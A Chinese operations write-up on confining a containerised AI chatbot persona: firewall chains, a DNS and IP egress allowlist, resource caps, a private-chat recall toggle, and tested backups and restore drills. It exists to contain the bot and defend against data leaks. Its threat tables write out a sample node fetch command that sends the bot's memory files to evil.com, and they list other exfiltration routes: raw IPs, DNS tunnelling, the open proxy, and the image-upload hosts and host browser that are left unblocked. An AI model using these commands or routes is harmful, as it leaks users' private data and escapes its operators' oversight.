# 她的边界：主机隔离 / 隐私出口 / 备份还原（2026-11-09）

上一份文档（`docs/workbench-2026-11-09.md`）解决的是「她有没有手」。
这一份解决的是**这只手能伸多远**——用户的优先级原话：

> 主要其实是防止问题蔓延到整个主机和泄露隐私信息，加上需要给其做备份以免把自己玩坏，
> 其他的其实不需要考虑过多的成本问题。

所以这里的取舍一律是：**功能退让给边界**。下面是今天实测出来的窟窿、落地的规则、
以及每条规则被哪条证据钉住。

---

## 1. 今天实测出来的三个真问题

| # | 窟窿 | 实测证据（改之前） |
|---|---|---|
| 1 | `HOST_IN` 里有一条 `-s 172.17.0.0/16 -j ACCEPT`：**docker 网桥来的全信** | 容器里 `http://192.168.5.2:3000 → 200`（agentapi 面板）、`:80/:443 → 200`（nginx 全站反代，里面是通讯/Misskey）、`172.17.0.1:3010/3070/9880 → OPEN`（SnowLuma/浏览器/TTS）。旧规则只管 `DOCKER-USER`（FORWARD），而目标是**宿主自己**的地址时走 INPUT —— 整条隔离链根本没看见这些包 |
| 2 | 容器可以解析并直连**任意公网域名** | `api.bilibili.com` 通，`example.com` 也通 —— 她写一行 `node -e fetch('https://evil', {body: readFileSync('.data/...')})` 就能把记忆发出去（`run_command` 白名单里 `node` 是允许的） |
| 3 | 备份只有"每天一次整包" | 白天写坏一份记忆/账本，最坏丢 24 小时；而且没人验证过包**能不能还原**（审计只比文件清单，不比"解开来能不能跑"） |

---

## 2. 主机侧：三条链，各管一个方向

`/usr/local/bin/dsh-bot-net-rules.sh`（v3，dsh-bot-net-refresh.timer 每 2 分钟重建一次，幂等）

```
第 1 道  DSH_OUT     宿主 uid 951 出站      回环之外一律 DROP（原来就有）
第 2 道  DSH_BOT_IN  容器 → 宿主自己        端口白名单（今天新增）
第 3 道  DSH_BOT_ISO 容器 → 内网 / 公网      内网全 DROP + 公网 ipset 白名单（今天新增）
```

### 2.1 容器能碰宿主的端口，只剩四个

白名单不是拍脑袋列的，是从 `bot.config.json` 里抄的**她真正在用**的端点：

| 端口 | 谁 | 配置出处 |
|---|---|---|
| 3010 | SnowLuma OneBot 网关 | `qq.snowluma_http` |
| 3066 | LLM / vision 代理 | `llm.base_url`、`vision.base_url` |
| 3070 | dsh-bot-browser | `BOT_BROWSER_URL` 默认值 |
| 9880 | GPT-SoVITS TTS | `voice.sovits_url` |

实测（容器内 TCP 连接）：

```
172.17.0.1:3010/3066/3070/9880 → OPEN
192.168.5.2:3000/80/443/22/3100/47984 → timeout（不是 refused —— 连"这个端口有人"都不告诉）
172.17.0.1:7890（Clash 开放代理）/8080（vaultwarden）→ timeout
```

> 为什么连 Clash 也不给：`7890` 是**开放代理**，给她等于把第 3 道链整个绕过。
> 代价：`scripts/fetch-stickers.mjs` 这类手动脚本走不了 Clash；她从没在聊天里用过它。

### 2.2 容器能去的内网：零

`DSH_BOT_ISO` 对 `192.168/16`、`10/8`、`172.16/12`、`100.64/10`、`169.254/16` 全 DROP。
目标是宿主自己的地址时另走 `DSH_BOT_IN`（见上）。

### 2.3 容器能去的公网：白名单域名解析出来的 IP，且仅 80/443

DNS 是这条链的**总闸**：`dnsmasq` 只监听 `172.17.0.1:53`，容器 `/etc/resolv.conf` 只指向它。

- 白名单（`/etc/dsh-bot-allow.txt`，35 条后缀）：`server=/域名/223.5.5.5` + `ipset=/域名/dsh_allow`
- 其余一切：`local=/#/` → **本地权威 NXDOMAIN**，查询报文都不出主机
- 解析出的 IP 自动进 `ipset dsh_allow`（30 分钟过期，dnsmasq 每次查询续期）
- 出口规则：`dst ∈ dsh_allow` 且 `dport ∈ {80,443}` 才放行；已建立连接先放行（避免长下载被 30 分钟过期砍断）
- `filter-AAAA`：容器没有 IPv6 出口，别让应用先试 AAAA 再等超时

实测：

```
容器内  https://api.bilibili.com/... → 200
容器内  https://example.com / pastebin.com / cdn.jsdelivr.net → ENOTFOUND
容器内  223.5.5.5:443（不在集合）→ timeout；119.84.174.96:443（B站，在集合）→ OPEN
```

### 2.4 资源上限（防"她一个进程把整机拖死"）

`docker update` 已生效，并写进 `dsh-bot-up.sh`（下次重建自动带上）：

```
--memory 4g --memory-swap 5g --pids-limit 2048 --cpus 3
--cap-drop ALL --security-opt no-new-privileges:true
--dns 172.17.0.1
-v $ROOT/entry.sh:/home/dsh/entry.sh:ro   # 宿主启动脚本不再可写
```

宿主一共 4 核 / 7G 内存，原来这个容器**无上限**：一个 fork 炸弹或一次大内存分配就能把整机打到 OOM。

---

## 3. 隐私：出口只有一个理由能开

### 3.1 出站白名单就是反 exfil 边界

她读得到自己的记忆、日记、B 站凭据（`credentials.json` 是 600、属她自己，功能需要）。
真正的防线不是"读不到"，而是**读到了也发不出去**：

| 手法 | 结果 |
|---|---|
| `node -e "fetch('https://evil.com', {body: fs.readFileSync('.data/...')})"` | `evil.com` → NXDOMAIN |
| 硬编码 IP 直连 | 不在 `dsh_allow` → DROP |
| DNS 隧道（查询里带数据） | 非白名单域名本地 NXDOMAIN，上游收不到查询 |
| 走宿主 Clash 7890 当代理 | 端口不在宿主白名单 |
| 上传到 `uguu.se` / `tmpfiles.org` | **仍然放行**（她发图要用）——这是已知残留风险，见 §6 |

要加新站点：`dsh-bot-egress add 域名`（立即刷新 dnsmasq + 防火墙）。
要应急全开：`dsh-bot-egress open`；恢复：`dsh-bot-egress allowlist`。两种都实测过：
`open` 会把**解析器一起放开**（`server=/#/…`），否则会出现"防火墙开了、DNS 还是 NXDOMAIN"的假回退
（第一版就踩了：只改 resolv.conf 不够，公网 53 本来就不通）。
切换用 `systemctl restart dnsmasq` 而不是 reload —— SIGHUP 会保留旧缓存，NXDOMAIN 也被缓存住。

### 3.2 群聊里的私聊内容：有开关了，默认还是你 10-26 的口径

`10-26` 你拍板「群里也要记得私聊，只要能分清人」，所以默认**不变**。
现在多了 `privacy.groupPrivateRecall`（DEFAULTS 里 `true`）：
设成 `false` 后，群聊的 `recallAll` 会整段跳过一对一私聊行（`memory.mjs` 的 `PRIVATE_CHAT_PLATFORMS`），
`persona.mjs` 同时停掉 `memory.recall/randomOld` 在群里的注入。

新回归：`test/privacy-audience-test.mjs`（7 条）——两种口径都钉住；
老的 `group-persona-test.mjs`（42 条）继续守着"默认不许忘私聊"。

---

## 4. 备份：从"每天一次"到"15 分钟一次 + 每周真还原"

### 4.1 新加的两个东西

| 组件 | 频率 | 作用 |
|---|---|---|
| `dsh-bot-snapshot-q15` | 每 15 分钟 | `rsync --link-dest` 硬链接快照 `data-home`（225MB 基线，未变文件共享 inode）。保留 96 份 = 24h 窗口；整点那份另存 `hourly-*` 便于找点 |
| `dsh-bot-restore-drill` | 每周日 05:20 | **真解包**最新 code/mind/work 三个包 → 查核心件（`persona.md`、`brain/self/me.md`、`AGENTS.md`、日记）→ 对 391 个 `.mjs` 逐个 `node --check` → 再查 q15 最新一份 |
| `dsh-bot-infra` 包 | 每天 | 新增：`/usr/local/bin/dsh-bot-*`、`dnsmasq.conf`、`dsh-bot-allow.txt`、egress 模式、systemd 单元 —— 宿主安全件也能还原 |
| `dsh-bot-home` 包 | 每天 | **2026-11-09 补**：`.dsh` 里非可重建的部分 —— `sessions/`（她的网页会话）、`bot-work/creative/`（6 篇小说）、`.credentials.yaml`（DSH 登录）、storages/profiles。此前这些**一个都不在备份里**（见 §4.4） |

`dsh-bot-backup-audit` 补了三类判据（原来只比包内文件 vs 盘上文件，包停更也能全绿）：

- 包年龄 > 26h → FAIL（日备 04:40 跑，26h = 一次漏跑就报；阈值可用 `AUDIT_MAX_HOURS` 临时覆盖）
- 15 分钟快照最新一份 > 40 分钟 → FAIL（快照链断了）
- `/home/backup-mirror` 各包缺失或 > 30h → FAIL

### 4.2 实测证据

```
restore drill：code 391 个 .mjs 解包 ok；mind 1154 个文件，persona.md / brain/self/me.md 在；
               work 三个文件在；q15 最新一份 2155 个文件  → drill OK（EXIT=0）
backup audit ：code/mind/work/infra 均 fresh；q15 fresh；audit result: OK（EXIT=0）
15m 快照     ：EXIT=0，q15 目录 220M（硬链接，未变文件不复制）
```

> 演练第一版就抓到一个真错：我假设核心件是 `brain/self.md`，实际是 `brain/self/me.md` 目录。
> 这正是"备份存在 ≠ 能还原"的证据 —— 顺手改掉了。

### 4.3 还原验证（2026-11-09 真跑了一遍，不是只看包在不在）

| 步骤 | 结果 |
|---|---|
| 解包四件套（code/mind/work/home）到暂存目录 | 392 个 `.mjs` / 1158 个记忆文件 / 6 篇小说 / 30 个 sessions / `.credentials.yaml` 均在 |
| 关键文件与现网比对 sha256 | `persona.md`、`brain/self/me.md`、`facts.json`、两本日记：**全部 same** |
| 用还原副本启动她的代码（隔离容器、`--network none`、TZ=Asia/Shanghai） | `persona` 装配 5124 字、无人格回退告警；`selftest` 只有 B站登录项因无网络失败（SESSDATA 本身在 `credentials.json` 里） |
| 还原副本上跑**完整**测试套 | **118 套全绿，EXIT=0**（132s） |
| 现网灾难演练 A：删 `persona.md` → 从 15m 快照还原 | hash 与灾难前一致，现网装配立刻恢复 |
| 现网灾难演练 B：删私人日记 → 从每日 work 包还原 | 与灾难前**完全一致** |
| 审计负例 | 抽走 mind 包 → audit 退出 1；放回 → 0 |

> 口径说明：还原副本 70MB vs 现网 4G，是因为备份排除了可重建项
> （`asr-venv` 2.8G、`asr-models` 464M、`browser-profile` 145M、`archive` 47M、`pyenv` 29M、`fonts` 18M），
> 审计的 `mind: MISSING 0` 证明"该备的都在"。

### 4.4 这轮验证抓到的真缺口

三件套只覆盖 `data/bot-work` 的 3 个文件。**她写的 6 篇小说（`creative/`）、30 个网页会话（`sessions/`）、
DSH 登录凭据（`.credentials.yaml`）当时不在任何包里** —— 宿主盘坏掉就永久消失。
现已新增 `dsh-bot-home` 包，并把这三类写进审计与还原演练的硬判据
（缺任一项 → audit/drill 直接非 0）。

### 4.5 还原怎么做

```bash
# 她的记忆/人格（最快的点：15 分钟粒度）
sudo rsync -a /home/dsh_bot/snapshots/q15/<时间戳>/ /home/dsh_bot/data-home/
# 整包（每天一份，含代码/记忆/日记/主机安全件）
sudo tar -xzf /home/backup/dsh_bot/dsh-bot-mind-<时间戳>.tar.gz -C /home/dsh_bot/data-home
sudo tar -xzf /home/backup/dsh_bot/dsh-bot-20261109-1555.tar.gz -C /
sudo tar -xzf /home/backup/dsh_bot/dsh-bot-infra-<时间戳>.tar.gz -C /
```

---

## 5. 判据（今天全部实测过，不是设计稿）

| 检查 | 结果 |
|---|---|
| 容器 → 宿主 3010/3066/3070/9880 | OPEN |
| 容器 → 宿主 3000/80/443/22/3100/47984/7890/8080 | timeout |
| 容器 → 内网 192.168.5.0/24 | DROP（DSH_BOT_ISO 计数增长） |
| 容器 → 公网白名单（B站） | 200 / 302 |
| 容器 → 公网非白名单（example.com、pastebin.com、jsdelivr） | ENOTFOUND |
| 容器 → 硬编码 IP（223.5.5.5:443） | timeout；`dsh-bot-egress open` 后 OPEN；恢复 allowlist 再 timeout |
| 她的全套回归 | `node tools/run-tests.mjs` → 117+1 套全绿、EXIT=0 |
| 其它容器 | agent2api healthy、agentapi/ntfy/rustdesk Up（未触碰它们所在网段的规则） |
| 备份 | 15m 快照 EXIT=0；restore drill EXIT=0；audit EXIT=0 |
| 真实业务 | 账本定时刷新（走 3066）、QQ 网关（3010）、TTS（9880）、浏览器（3070）均在本轮日志里正常 |
| 真工具调用 | `bili_search`（专栏 6 篇）、`look_up`（360 搜索结果 3 条）、`find_files`/`read_file`/`run_command` 全部 ok |
| 规则幂等 | 连跑 3 次：`DOCKER-USER` / `HOST_IN` 各只有 1 条跳转 |
| 快照并发 | 三进程同时跑：两个被 flock 挡下（日志 `skip: previous run`），一个成功 |
| 审计负例 | 把全部 `mind` 包挪走 → audit 退出码 1 + `NO PACKAGE`；放回 → 退出码 0 |
| 回退演练 | `open` → 容器能访问 `pastebin.com`（200）；`allowlist` → 同 IP 立刻 blocked |

---

## 6. 已知残留风险（别当成 bug）

1. **`uguu.se` / `tmpfiles.org` 是放行的**（她发图要上传）。理论上可以把记忆改名成图片传上去。
   要彻底堵就得废掉她的发图能力 —— 目前判断不值得。
2. **宿主上的 dsh-bot-browser（uid baka）不受这套 DNS 白名单管**。它能访问任意公网站点，
   相当于一条"只读但可带 query 参数"的出口。堵法：给浏览器单独建 uid + 出站规则，或给 `browser.mjs`
   加同一份域名白名单。今天没做（会改变她"能读任意网页"的能力，先留给你拍板）。
3. **`dsh-bot-egress open` 是全开**：应急开关在 `/etc/dsh-bot-egress.mode`，谁改谁负责。
4. **容器 /etc/resolv.conf 在容器内是 root 所有**，她（uid 951）改不了；但 `docker rm` 重建会重置 ——
   已经写进 `dsh-bot-up.sh` 的 `--dns 172.17.0.1`，重建后仍然生效。
5. **没有做 IPv6 出口**：容器没有 v6 地址，`filter-AAAA` 让应用不去试。以后若给 docker 开 v6，
   这层要重做（`ip6tables` 的对称规则）。

---

## 7. 文件清单

| 文件 | 作用 |
|---|---|
| `/usr/local/bin/dsh-bot-net-rules.sh` | 三条链（v3，本次改） |
| `/usr/local/bin/dsh-bot-dns-allow.sh` | 白名单 → dnsmasq 配置 + ipset |
| `/usr/local/bin/dsh-bot-egress` | `status / open / allowlist / add 域名` 开关（新） |
| `/etc/dsh-bot-allow.txt` | 出站域名白名单（35 条后缀） |
| `/etc/dsh-bot-egress.mode` | `allowlist`（默认）/ `open` |
| `/etc/dnsmasq.conf` + `/etc/dnsmasq.d/90-dsh-bot-allow.conf` | 只服务 172.17.0.1:53 的解析器 |
| `/etc/systemd/system/dnsmasq.service.d/dsh-bot.conf` | 等 docker0 + 建 ipset |
| `/usr/local/bin/dsh-bot-snapshot-q15` + `.timer` | 15 分钟硬链接快照 |
| `/usr/local/bin/dsh-bot-restore-drill` + `.timer` | 每周真还原演练 |
| `/usr/local/bin/dsh-bot-up.sh` | 重建参数（限额/ro/`--dns`/cap-drop） |
| `tools/lib/memory.mjs`、`tools/lib/persona.mjs`、`tools/lib/config.mjs` | `privacy.groupPrivateRecall`（新开关） |
| `test/privacy-audience-test.mjs` | 7 条群聊隐私回归 |
